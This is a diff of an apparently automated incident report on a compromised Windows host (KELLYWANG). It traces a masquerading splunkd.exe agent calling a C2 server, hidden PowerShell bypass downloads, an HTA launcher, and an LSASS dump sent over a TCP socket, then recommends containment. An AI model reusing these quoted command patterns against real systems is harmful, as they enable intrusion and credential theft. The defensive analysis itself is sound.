@@ -1,49 +1,58 @@
-# EXECUTIVE INCIDENT OUTCOME REPORT: INC-53018 (Incident-008)
+# INVESTIGATION SUMMARY: INC-53018 (Incident-008)
 
 **Final Severity:** High
-*Severity is set to High. The incident involves confirmed suspicious activity (unknown processes, odd device behavior) with potential lateral movement (MITRE T1021) between internal hosts. While no sensitive data or critical system is confirmed, the escalation factors include: potential lateral movement/spreading activity, multiple systems potentially affected (192.168.10.204 and 192.168.10.202), and the triage risk rating is High (score 70). Per Appendix A.2, 'Strongly suspected or confirmed cyber attack affecting important assets, users, or systems' and 'Successful unauthorised access, malicious IOC, privilege misuse, server attack, repeated suspicious activity' map to High severity. It does not meet Critical criteria as there is no confirmed ransomware, data exfiltration, or widespread service outage.*
+*High severity is justified because the case involves a compromised asset with repeated suspicious execution on an internal endpoint, evidence of masquerading binaries, HTA/PowerShell bypass activity, internal remote services communication, and possible credential-dumping/data-exfiltration behavior. Appendix A escalation factors apply due to suspected malware/privilege misuse, repeated activity, and possible impact to an important business endpoint, but there is no confirmed widespread outage, ransomware, or proven large-scale data loss to warrant Critical.*
 
-**Confidence Level:** Medium
-*Confidence is set to Medium. Per Appendix F.3, Medium confidence means 'Some evidence supports the conclusion, but there are gaps.' The incident has multiple indicators (unknown processes, odd behavior, internal traffic changes, 4 matched IOCs) but lacks critical details such as confirmed process names/paths, confirmed malicious files, confirmed data exfiltration, or endpoint forensic evidence. The evidence is partially sufficient - some evidence exists but there are gaps in the process tree and full scope of compromise. Per Appendix F.2, this is 'Partially sufficient evidence' requiring continued investigation.*
+**Confidence Level:** High
+*Confidence is High because multiple correlated alerts and telemetry sources align across timestamps, hosts, process command lines, hashes, and threat intelligence. The evidence consistently shows the same endpoint, same internal IP pair, recurring malicious process behavior, and IOC-backed file reputation, satisfying the sufficient evidence and high-confidence criteria in Appendix F.*
 
-## Business Impact Assessment (Appendix C)
-- **Critical System**: unknown
-- **Essential Service**: unknown
-- **Data Sensitivity**: unknown
-- **Operational Impact**: unknown
+## Investigative Workflow
+- Correlated the current alert with prior NetWitness endpoint alerts for host KELLYWANG.
+- Identified the active host, source IP 192.168.10.204, and internal destination IP 192.168.10.202.
+- Reviewed process indicators for splunkd.exe, powershell.exe, and Password_Reset.hta.
+- Mapped observed command lines to downloader, bypass, and possible credential-dumping behavior.
+- Assessed that the evidence supports a compromised endpoint with possible lateral movement or exfiltration behavior.
+- Determined the case requires SOC Analyst review and containment action due to High severity.
 
-## Technical Chronology Summary
-On 2025-11-18 at 03:18 UTC, NetWitness Endpoint generated high-risk alerts on host KELLYWANG (IP 192.168.10.204). The alerts indicated unknown processes running and odd device behavior. Network telemetry showed traffic from KELLYWANG (192.168.10.204) to another internal host at 192.168.10.202, suggesting possible lateral movement or data exfiltration. The MITRE ATT&CK technique identified was T1021 (Remote Services) under the Lateral Movement tactic. The triage identified 4 matched IOCs including changes in network traffic telemetry, unknown traffic between internal IPs, odd device behavior, and unknown processes running. The overall risk was assessed as High.
+## Technical Chronology & MITRE ATT&CK TTP Mapping
+
+Chronology: 2025-07-21 08:24:01+00:00 — NetWitness flagged KELLYWANG for suspicious internal hacking activity on Windows host KELLYWANG (source IP 192.168.10.204) communicating with internal IP 192.168.10.202 over HTTP port 8888. Observed IOCs included splunkd.exe and powershell.exe, with command line evidence of splunkd.exe -server http://192.168.10.202:8888 -group red and hidden PowerShell using ExecutionPolicy Bypass to download sandcat.go from /file/download. VirusTotal associated hash 4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607 with sandcat.go-windows and 47 malicious detections. 2025-07-21 08:42:37+00:00 — A second alert on the same host re-confirmed compromised asset behavior with the same file hash and internal HTTP callback pattern to 192.168.10.202:8888, again involving splunkd.exe and powershell.exe and indicating likely unauthorized execution/host compromise. 2025-07-21 10:58:22+00:00 — Additional telemetry showed Password_Reset.hta executing on KELLYWANG, launching PowerShell with ExecutionPolicy Bypass and hidden window options. Command-line evidence showed internal communication to 192.168.10.202:8888 and 4444, including a downloader pattern for sandcat.go and a PowerShell TCPClient routine targeting 192.168.10.202:4444 while referencing C:\Users\Public\lsass_680.dmp, suggesting possible credential dumping and possible data transfer/exfiltration. The file hash 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb was associated with Password_Reset.hta and had OTX relation to 'LATAM Banking Trojan: 0-Click WebDAV to MSHTA Process Hollowing'. 2025-07-23 08:48:47+00:00 — A further high-risk alert again showed suspicious splunkd.exe, Password_Reset.hta, and powershell.exe execution on KELLYWANG from Public/Downloads paths with internal network communication to 192.168.10.202:8888, reinforcing persistent malicious execution on the same endpoint. 2025-11-18 03:18:37+00:00 — The current incident INC-53018 classified the same endpoint as a compromised asset (non-critical), with high SOC classification and telemetry indicating possible lateral movement or data exfiltration between 192.168.10.204 and 192.168.10.202. Recorded IOCs across the incident include host KELLYWANG, source IP 192.168.10.204, destination IP 192.168.10.202, ports 8888 and 4444, files splunkd.exe, Password_Reset.hta, powershell.exe, lsass_680.dmp, and hashes 4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607 and 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb.
+
+| Timeline Phase / Activity | Observed Evidence | MITRE Tactic | MITRE Technique Name | MITRE ID |
+| --- | --- | --- | --- | --- |
+| Initial malicious execution on endpoint | powershell.exe executed with -WindowStyle Hidden -ExecutionPolicy Bypass; command downloaded from http://192.168.10.202:8888/file/download and set headers for platform=windows and file=sandcat.go on host KELLYWANG (192.168.10.204). Hash 4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607 linked to sandcat.go-windows. | Execution | PowerShell | T1059.001 |
+| Masqueraded executable launch and staged payload execution | splunkd.exe executed from Public/Downloads context with command line '-server http://192.168.10.202:8888 -group red' and later '-group elevated' on KELLYWANG, indicating a suspicious benign-name masquerade and staged operator tooling. | Defense Evasion | Masquerading | T1036 |
+| Script-based file execution via HTA | Password_Reset.hta observed on KELLYWANG with PowerShell spawning from HTA context; OTX relation identified 'LATAM Banking Trojan: 0-Click WebDAV to MSHTA Process Hollowing' for hash 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb. | Execution | Mshta | T1218.005 |
+| Potential remote services / internal pivoting | Host-to-host traffic between 192.168.10.204 and 192.168.10.202 over ports 8888 and 4444, with incident-level classification explicitly referencing possible lateral movement and remote services behavior. | Lateral Movement | Remote Services | T1021 |
+| Possible credential dumping / credential access | PowerShell command referenced reading 'C:\Users\Public\lsass_680.dmp' and using System.Net.Sockets.TCPClient to send data to 192.168.10.202:4444, consistent with possible LSASS dump handling and transfer. | Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 |
+| Possible data transfer / exfiltration over internal network | Internal HTTP callback/download patterns to 192.168.10.202:8888 and a TCPClient session to 192.168.10.202:4444, with bytes being written from an LSASS dump file, indicating possible staged data transfer or exfiltration. | Exfiltration | Exfiltration Over C2 Channel | T1041 |
 
 ## Playbook Execution Trace
 | Step ID | Instruction | Status | Findings |
 | --- | --- | --- | --- |
-| `step_1` | Identify 1. datetime, 2. Email address of sender/receiver, 3 IP address of sender/receiver and 4. subject of email. | **NOT_MET** | No email-related data is available in the incident. The alert originates from NetWitness Endpoint (host-based detection), not from an email security gateway. No sender/receiver email addresses or email subject lines are present in the incident data. |
-| `step_2` | Does phishing attempt contain a URL or attachment? | **NOT_MET** | No phishing email artifacts (URLs or attachments) are present in the incident data. The alert is based on endpoint behavioral detections (unknown processes, odd device behavior, network traffic changes) rather than email-based indicators. |
-| `step_3` | Was any malicious process spawned on the victim's machine? | **NOT_MET** | The incident mentions 'unknown processes running' and 'odd device behavior' on host KELLYWANG (192.168.10.204), but no specific process names, paths, or PIDs are provided in the available data to confirm malicious process spawning. |
-| `step_4` | Analyze the process tree for signs of malicious activity, such as privilege escalation, lateral movement, or data exfiltration. | **NOT_MET** | The incident indicates potential lateral movement (MITRE ATT&CK T1021 - Remote Services) with traffic between 192.168.10.204 (KELLYWANG) and 192.168.10.202. However, no detailed process tree data is available for analysis. The triage notes mention 'unknown traffic originating from/terminating on the device' and 'unknown process running' as indicators of compromise. |
-| `step_5` | Based on the analysis, determine if further investigation is necessary and the containment steps | **NOT_MET** | The phishing playbook is not applicable to this incident. The alert is an endpoint behavioral detection (NetWitness Endpoint) with signs of lateral movement, not a phishing email. Further investigation is required using a different playbook (e.g., Lateral Movement or Compromised Asset playbook). Containment of host KELLYWANG (192.168.10.204) is recommended. |
-
-## Actions Taken
-- Reviewed incident details and alert classification from NetWitness Endpoint
-- Identified affected host KELLYWANG (192.168.10.204) and target host (192.168.10.202)
-- Analyzed MITRE ATT&CK mapping to T1021 Remote Services (Lateral Movement)
-- Reviewed triage IOC summary and risk rating (High risk score of 70)
-- Determined that the Phishing playbook is not applicable to this endpoint behavioral alert
-- Assessed business impact using Appendix C checklist
+| `step_1` | Identify 1. username 2. IP address 3. Login Details 4. Computer name 5. Operating System | **MET** | Username identified as KELLYWANG\Kelly Wang. Source host IP identified as 192.168.10.204, with internal destination/target IP 192.168.10.202 also present. No explicit authentication/login event was provided in the timeline. Computer name identified as KELLYWANG. Operating system on the later incident record is Unknown; earlier correlated endpoint telemetry indicates Windows on the same host. |
+| `step_2` | Was it horizontal or vertical | **NOT_MET** | The evidence supports possible lateral movement between internal systems, but it does not conclusively establish horizontal vs. vertical movement or confirm privilege boundary crossing. The timeline only shows internal host-to-host traffic and suspected remote services activity. |
+| `step_3` | Was any malicious process spawned on the victim's machine? | **MET** | Yes. Prior correlated telemetry shows suspicious process execution on KELLYWANG including powershell.exe with ExecutionPolicy Bypass and hidden window options, splunkd.exe masquerading from Public/Downloads paths, and Password_Reset.hta launching PowerShell. These are consistent with malicious or unauthorized execution. |
+| `step_4` | Analyze the process tree for signs of malicious activity, such as privilege escalation, lateral movement, or data exfiltration. | **MET** | The process chain indicates malicious activity: HTA launching PowerShell, PowerShell using Bypass and hidden execution, masquerading splunkd.exe activity, and internal network communication to 192.168.10.202 on ports 8888 and 4444. Prior telemetry also referenced lsass_680.dmp and a TCPClient to 192.168.10.202:4444, suggesting possible credential dumping and possible exfiltration/reverse-shell style behavior. The 2025-11-18 record specifically frames the incident as possible lateral movement or data exfiltration. |
+| `step_5` | Based on the analysis, determine if further investigation is necessary and the containment steps | **MET** | Further investigation and containment are required. Recommended actions include isolating host KELLYWANG (192.168.10.204), blocking traffic to 192.168.10.202 on ports 8888 and 4444, preserving volatile evidence and process artifacts, terminating suspicious processes only after capture, collecting malicious files/hashes, and hunting for related activity across the environment. |
 
 ## Recommended Containment Actions
-- Isolate the host KELLYWANG (192.168.10.204) immediately from the network by disabling its network adapter or blocking its IP at the local switch to prevent further lateral movement or data exfiltration.
-- Block all outbound traffic from 192.168.10.204 to 192.168.10.202 at the firewall or network segmentation boundary to halt any active lateral movement or data exfiltration sessions.
-- Conduct a forensic image of KELLYWANG (192.168.10.204) for further analysis of the unknown processes and odd device behavior.
-- Review and revoke any active remote sessions (RDP, WinRM, SSH, etc.) originating from KELLYWANG (192.168.10.204) to other internal hosts.
-- Check host 192.168.10.202 for signs of compromise or unauthorized access originating from KELLYWANG.
+- Immediately isolate KELLYWANG (192.168.10.204) from the network using EDR network containment while preserving local disk and volatile memory evidence.
+- Block outbound and east-west traffic from 192.168.10.204 to 192.168.10.202 on TCP/8888 and TCP/4444 at the firewall, proxy, and NAC layers.
+- Quarantine and acquire the files splunkd.exe, Password_Reset.hta, and any related staged payloads from Public and Downloads paths, preserving original hashes 4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607 and 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb.
+- Capture a memory image from KELLYWANG before process termination to preserve evidence of PowerShell, TCPClient activity, and any injected or reflective code.
+- Terminate only the confirmed malicious process tree after evidence collection, including hidden powershell.exe, masquerading splunkd.exe, and mshta-launched child processes.
+- Disable or reset the user session for KELLYWANG\Kelly Wang until account compromise is excluded, and force credential reset if any credential exposure is confirmed.
+- Hunt enterprise-wide for the IOC set: 192.168.10.202, 192.168.10.204, TCP/8888, TCP/4444, splunkd.exe, Password_Reset.hta, sandcat.go-windows hash 4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607, and the HTA hash 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb.
+- Review Windows event logs, PowerShell logs, and Sysmon telemetry on KELLYWANG for process creation, file drop locations, and any evidence of lsass access or dump creation.
+- If any evidence of credential access is validated, invalidate active tokens and rotate credentials for affected accounts and any privileged accounts used from the host.
 
 ## Appendix M: Policy-Based Compliance Audit Log
 
 | Audit ID | Decision Point | Policy Reference | Input Summary | Result | Decision Made | Human Review? | Timestamp |
 | --- | --- | --- | --- | --- | --- | --- | --- |
-| `AUD-DP07-1784697349-1` | **DP-07** | Appendix C | Critical System: False, Sensitive Data: False | *Pass* | `Investigate` | Yes | 2026-07-22T05:15:49Z |
-| `AUD-DP08-1784697349-2` | **DP-08** | Appendix A | Severity classification: High | *Warning* | `Escalate` | Yes | 2026-07-22T05:15:49Z |
-| `AUD-DP09-1784697349-3` | **DP-09** | Appendix F | Confidence level: Medium | *Warning* | `Escalate` | Yes | 2026-07-22T05:15:49Z |
-| `AUD-DP10-1784697349-4` | **DP-10/DP-11** | Appendix G | Severity: High, Confidence: Medium, Ransomware: False, Guest OS: False | *Fail* | `Escalate` | Yes | 2026-07-22T05:15:49Z |
+| `AUD-DP07-1785073722-1` | **DP-07** | Appendix C | Critical System: False, Sensitive Data: True | *Warning* | `Investigate` | Yes | 2026-07-26T13:48:42Z |
+| `AUD-DP08-1785073722-2` | **DP-08** | Appendix A | Severity classification: High | *Warning* | `Escalate` | Yes | 2026-07-26T13:48:42Z |
+| `AUD-DP09-1785073722-3` | **DP-09** | Appendix F | Confidence level: High | *Pass* | `Investigate` | Yes | 2026-07-26T13:48:42Z |
+| `AUD-DP10-1785073722-4` | **DP-10/DP-11** | Appendix G | Severity: High, Confidence: High, Ransomware: False, Guest OS: False | *Fail* | `Escalate` | Yes | 2026-07-26T13:48:42Z |
+| `AUD-DP15-1785073722-5` | **DP-15** | Appendix B | Sensitive or personal data accessed or exfiltrated. | *Warning* | `Escalate` | Yes | 2026-07-26T13:48:42Z |
